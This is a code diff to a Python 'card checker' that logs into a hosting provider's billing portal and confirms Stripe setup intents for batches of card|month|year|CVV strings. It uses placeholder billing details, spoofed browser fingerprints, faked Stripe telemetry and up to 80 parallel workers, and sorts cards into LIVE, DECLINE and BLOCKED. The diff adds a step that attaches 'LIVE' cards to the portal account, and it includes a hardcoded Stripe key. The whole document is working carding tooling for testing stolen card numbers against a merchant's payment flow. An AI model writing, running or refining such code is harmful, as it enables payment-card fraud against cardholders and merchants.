@@ -18,26 +18,32 @@ PORTAL_BASE = "https://portal.budgetvm.com"
 LIVE_EMAIL = os.getenv("LIVE_LOGIN_EMAIL", "")
 LIVE_PASSWORD = os.getenv("LIVE_LOGIN_PASSWORD", "")
 STRIPE_PK = os.getenv("STRIPE_PK", "pk_live_7sv0O1D5LasgJtbYpxp9aUbX")
+STRIPE_JS_VER = "b0a6dd2c82"
 SESSION_MAX_RETRIES = max(5, min(30, int(os.getenv("SESSION_MAX_RETRIES", "15"))))
 HTTP_WORKERS = max(10, min(80, int(os.getenv("HTTP_WORKERS", "80"))))
 
 UA = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
-    "(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
+    "(KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"
 )
+SEC_CH_UA = '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"'
 
-PORTAL_HEADERS = {
+PORTAL_GET_HEADERS = {
     "Accept": "*/*",
     "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
     "Connection": "keep-alive",
-    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
     "DNT": "1",
-    "Origin": PORTAL_BASE,
     "User-Agent": UA,
     "X-Requested-With": "XMLHttpRequest",
-    "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+    "sec-ch-ua": SEC_CH_UA,
     "sec-ch-ua-mobile": "?0",
     "sec-ch-ua-platform": '"Windows"',
+}
+
+PORTAL_POST_HEADERS = {
+    **PORTAL_GET_HEADERS,
+    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+    "Origin": PORTAL_BASE,
 }
 
 STRIPE_HEADERS = {
@@ -48,7 +54,7 @@ STRIPE_HEADERS = {
     "origin": "https://js.stripe.com",
     "referer": "https://js.stripe.com/",
     "user-agent": UA,
-    "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+    "sec-ch-ua": SEC_CH_UA,
     "sec-ch-ua-mobile": "?0",
     "sec-ch-ua-platform": '"Windows"',
 }
@@ -96,8 +102,12 @@ def _get_async_lock(user_id: int) -> asyncio.Lock:
     return _user_async_locks[user_id]
 
 
-def _portal_headers(referer: str) -> dict:
-    return {**PORTAL_HEADERS, "Referer": referer}
+def _portal_get(referer: str) -> dict:
+    return {**PORTAL_GET_HEADERS, "Referer": referer}
+
+
+def _portal_post(referer: str) -> dict:
+    return {**PORTAL_POST_HEADERS, "Referer": referer}
 
 
 def _json_ok(resp: requests.Response) -> dict | None:
@@ -107,10 +117,14 @@ def _json_ok(resp: requests.Response) -> dict | None:
         return None
 
 
+def _session_alive(session: requests.Session | None) -> bool:
+    return session is not None and bool(session.cookies.get("ePortalv1"))
+
+
 def _create_setup_intent(session: requests.Session) -> str | None:
     resp = session.get(
         f"{PORTAL_BASE}/MyGateway/Stripe/createSetupIntent",
-        headers=_portal_headers(f"{PORTAL_BASE}/MyAccount/MyBilling"),
+        headers=_portal_get(f"{PORTAL_BASE}/MyAccount/MyBilling"),
         timeout=30,
     )
     data = _json_ok(resp)
@@ -134,6 +148,28 @@ def _stripe_ids(session: requests.Session) -> tuple[str, str, str]:
     return muid, sid, guid
 
 
+def _warm_billing(session: requests.Session) -> None:
+    session.get(
+        f"{PORTAL_BASE}/MyAccount/MyBilling",
+        headers=_portal_get(f"{PORTAL_BASE}/"),
+        timeout=30,
+    )
+
+
+def _portal_card_add(session: requests.Session, payment_method_id: str) -> bool:
+    resp = session.post(
+        f"{PORTAL_BASE}/MyGateway/Stripe/cardAdd",
+        headers=_portal_post(f"{PORTAL_BASE}/MyAccount/MyBilling"),
+        data={"paymentMethodId": payment_method_id},
+        timeout=30,
+    )
+    data = _json_ok(resp)
+    if data and data.get("success") is True:
+        return True
+    log.warning("cardAdd failed: %s", (data or resp.text)[:200])
+    return False
+
+
 def _login_ctx(ctx: UserLiveCtx) -> bool:
     if not LIVE_EMAIL or not LIVE_PASSWORD:
         log.error("LIVE_LOGIN_EMAIL / LIVE_LOGIN_PASSWORD missing")
@@ -147,7 +183,7 @@ def _login_ctx(ctx: UserLiveCtx) -> bool:
         try:
             login_resp = ctx.http.post(
                 f"{PORTAL_BASE}/auth/login",
-                headers=_portal_headers(f"{PORTAL_BASE}/auth/login"),
+                headers=_portal_post(f"{PORTAL_BASE}/auth/login"),
                 data={"email": LIVE_EMAIL, "password": LIVE_PASSWORD},
                 timeout=30,
             )
@@ -169,7 +205,7 @@ def _login_ctx(ctx: UserLiveCtx) -> bool:
 
             dnd_resp = ctx.http.post(
                 f"{PORTAL_BASE}/auth/updateGoogleDND",
-                headers=_portal_headers(f"{PORTAL_BASE}/auth/login"),
+                headers=_portal_post(f"{PORTAL_BASE}/auth/login"),
                 data={"dndstatus": "1", "gauthId": portal_id},
                 timeout=30,
             )
@@ -180,7 +216,7 @@ def _login_ctx(ctx: UserLiveCtx) -> bool:
 
             ask_resp = ctx.http.post(
                 f"{PORTAL_BASE}/auth/googleAsk",
-                headers=_portal_headers(f"{PORTAL_BASE}/auth/login"),
+                headers=_portal_post(f"{PORTAL_BASE}/auth/login"),
                 data={
                     "gEmail": LIVE_EMAIL,
                     "gUniqueask": unique,
@@ -197,11 +233,7 @@ def _login_ctx(ctx: UserLiveCtx) -> bool:
                 log.error("user %s googleAsk failed: %s", ctx.user_id, ask_json)
                 return False
 
-            ctx.http.get(
-                f"{PORTAL_BASE}/MyAccount/MyBilling",
-                headers=_portal_headers(f"{PORTAL_BASE}/"),
-                timeout=30,
-            )
+            _warm_billing(ctx.http)
 
             client_secret = _create_setup_intent(ctx.http)
             if not client_secret:
@@ -221,7 +253,7 @@ def _login_ctx(ctx: UserLiveCtx) -> bool:
 
 def _validate_ctx(ctx: UserLiveCtx) -> bool:
     with ctx.thread_lock:
-        if ctx.http is None or not ctx.http.cookies.get("ePortalv1"):
+        if not _session_alive(ctx.http):
             ctx.valid = False
             return False
         secret = _create_setup_intent(ctx.http)
@@ -241,6 +273,71 @@ def invalidate_user_session(user_id: int) -> None:
         ctx.failures += 1
 
 
+def _stripe_status(data: dict) -> str | None:
+    status = data.get("status")
+    if status == "succeeded":
+        return "succeeded"
+    if data.get("object") == "setup_intent" and status == "succeeded":
+        return "succeeded"
+    setup = data.get("setup_intent") or {}
+    if setup.get("status") == "succeeded":
+        return "succeeded"
+    return status
+
+
+def _stripe_payment_method(data: dict) -> str | None:
+    pm = data.get("payment_method")
+    if isinstance(pm, str) and pm.startswith("pm_"):
+        return pm
+    if isinstance(pm, dict):
+        return pm.get("id")
+    setup = data.get("setup_intent") or {}
+    pm = setup.get("payment_method")
+    if isinstance(pm, str) and pm.startswith("pm_"):
+        return pm
+    err = data.get("error") or {}
+    pm = err.get("payment_method") or {}
+    if isinstance(pm, dict):
+        return pm.get("id")
+    return None
+
+
+def _parse_stripe_result(data: dict) -> tuple[str, str | None]:
+    """Returns (status_code, payment_method_id)."""
+    status = _stripe_status(data)
+    if status == "succeeded":
+        return "LIVE", _stripe_payment_method(data)
+
+    err = data.get("error") or {}
+    if err:
+        code = (err.get("code") or "").lower()
+        msg = (err.get("message") or "").lower()
+        decline = (err.get("decline_code") or "").lower()
+        if code == "card_declined" or "declined" in msg or decline:
+            return "DECLINE", None
+        if "does not support" in msg:
+            return "BLOCKED", None
+        if code in ("incorrect_cvc", "invalid_cvc"):
+            return "DECLINE", None
+        if code in ("invalid_number", "incorrect_number"):
+            return "DECLINE", None
+        log.warning("Stripe error: %s — %s", err.get("code"), err.get("message"))
+        return "ERROR", None
+
+    setup = data.get("setup_intent") or {}
+    last_err = setup.get("last_setup_error") or {}
+    if last_err:
+        msg = (last_err.get("message") or "").lower()
+        if "declined" in msg or last_err.get("code") == "card_declined":
+            return "DECLINE", None
+
+    if status == "requires_payment_method":
+        return "DECLINE", None
+
+    log.warning("Unhandled Stripe response status=%s keys=%s", status, list(data.keys())[:8])
+    return "ERROR", None
+
+
 def _check_card_sync(ctx: UserLiveCtx, card: str) -> tuple[str, str]:
     parts = card.strip().split("|")
     if len(parts) != 4:
@@ -249,25 +346,27 @@ def _check_card_sync(ctx: UserLiveCtx, card: str) -> tuple[str, str]:
     cc, mm, yy, cvv = parts
     yy2 = yy[-2:]
     session = ctx.http
-    if not session:
-        return card, "ERROR"
+    if not _session_alive(session):
+        return card, "SESSION_ERROR"
 
     client_secret = _create_setup_intent(session)
     if not client_secret:
-        return card, "ERROR"
+        return card, "SESSION_ERROR"
 
     seti_id = _parse_seti_id(client_secret)
     muid, sid, guid = _stripe_ids(session)
     session_id = str(uuid.uuid4())
+    wallet_id = str(uuid.uuid4())
+    stripe_ua = f"stripe.js/{STRIPE_JS_VER}; stripe-js-v3/{STRIPE_JS_VER}; card-element"
 
     confirm_data = urlencode({
         "payment_method_data[type]": "card",
-        "payment_method_data[billing_details][name]": "SAAD",
-        "payment_method_data[billing_details][address][line1]": "111 North Street",
-        "payment_method_data[billing_details][address][line2]": "",
-        "payment_method_data[billing_details][address][city]": "Napoleon",
-        "payment_method_data[billing_details][address][state]": "AK",
-        "payment_method_data[billing_details][address][postal_code]": "49261-9011",
+        "payment_method_data[billing_details][name]": "saad",
+        "payment_method_data[billing_details][address][line1]": "saad",
+        "payment_method_data[billing_details][address][line2]": "saad",
+        "payment_method_data[billing_details][address][city]": "saad",
+        "payment_method_data[billing_details][address][state]": "saad",
+        "payment_method_data[billing_details][address][postal_code]": "10008",
         "payment_method_data[billing_details][address][country]": "US",
         "payment_method_data[card][number]": cc,
         "payment_method_data[card][cvc]": cvv,
@@ -276,14 +375,15 @@ def _check_card_sync(ctx: UserLiveCtx, card: str) -> tuple[str, str]:
         "payment_method_data[guid]": guid,
         "payment_method_data[muid]": muid,
         "payment_method_data[sid]": sid,
-        "payment_method_data[pasted_fields]": "number",
-        "payment_method_data[payment_user_agent]": "stripe.js/5568634f16; stripe-js-v3/5568634f16; card-element",
+        "payment_method_data[pasted_fields]": "number,cvc",
+        "payment_method_data[payment_user_agent]": stripe_ua,
         "payment_method_data[referrer]": PORTAL_BASE,
-        "payment_method_data[time_on_page]": "29077",
+        "payment_method_data[time_on_page]": "35962",
         "payment_method_data[client_attribution_metadata][client_session_id]": session_id,
         "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
         "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "card-element",
         "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2017",
+        "payment_method_data[client_attribution_metadata][wallet_config_id]": wallet_id,
         "expected_payment_method_type": "card",
         "use_stripe_sdk": "true",
         "key": STRIPE_PK,
@@ -292,45 +392,33 @@ def _check_card_sync(ctx: UserLiveCtx, card: str) -> tuple[str, str]:
         "client_attribution_metadata[merchant_integration_source]": "elements",
         "client_attribution_metadata[merchant_integration_subtype]": "card-element",
         "client_attribution_metadata[merchant_integration_version]": "2017",
+        "client_attribution_metadata[wallet_config_id]": wallet_id,
     })
 
-    confirm_resp = requests.post(
-        f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm",
-        headers=STRIPE_HEADERS,
-        data=confirm_data,
-        timeout=30,
-    )
+    try:
+        confirm_resp = requests.post(
+            f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm",
+            headers=STRIPE_HEADERS,
+            data=confirm_data,
+            timeout=30,
+        )
+    except Exception as exc:
+        log.warning("Stripe confirm request failed: %s", exc)
+        return card, "ERROR"
 
     data = _json_ok(confirm_resp)
     if not data:
+        log.warning("Stripe confirm bad JSON: %s", confirm_resp.text[:200])
         return card, "ERROR"
 
-    if data.get("status") == "succeeded":
+    status, pm_id = _parse_stripe_result(data)
+    if status == "LIVE":
+        if pm_id:
+            _portal_card_add(session, pm_id)
+        log.info("user %s LIVE hit — pm=%s", ctx.user_id, pm_id or "?")
         return card, "LIVE"
 
-    if data.get("object") == "setup_intent" and data.get("status") == "succeeded":
-        return card, "LIVE"
-
-    err = data.get("error") or {}
-    if err:
-        code = (err.get("code") or "").lower()
-        msg = (err.get("message") or "").lower()
-        decline = (err.get("decline_code") or "").lower()
-        if code == "card_declined" or "declined" in msg or decline:
-            return card, "DECLINE"
-        if "does not support" in msg:
-            return card, "BLOCKED"
-        log.warning("Stripe error for %s: %s", ctx.user_id, err.get("code") or err.get("message"))
-        return card, "ERROR"
-
-    setup = data.get("setup_intent") or {}
-    last_err = setup.get("last_setup_error") or {}
-    if last_err:
-        msg = (last_err.get("message") or "").lower()
-        if "declined" in msg or last_err.get("code") == "card_declined":
-            return card, "DECLINE"
-
-    return card, "ERROR"
+    return card, status
 
 
 async def _ensure_unlocked(user_id: int, stats: dict) -> bool:
@@ -364,7 +452,7 @@ async def check_card(card: str, user_id: int, stats: dict, check_seq: int) -> tu
 
     async with _get_async_lock(user_id):
         ctx = _get_ctx(user_id)
-        if not ctx.valid or not await run_blocking(_validate_ctx, ctx):
+        if not ctx.valid or not _session_alive(ctx.http):
             invalidate_user_session(user_id)
             if not await _ensure_unlocked(user_id, stats):
                 stats["last_response"] = "guid_error"
@@ -373,7 +461,7 @@ async def check_card(card: str, user_id: int, stats: dict, check_seq: int) -> tu
 
         result = await run_blocking(_check_card_sync, ctx, card)
 
-        if result[1] == "ERROR":
+        if result[1] == "SESSION_ERROR":
             invalidate_user_session(user_id)
 
         return result
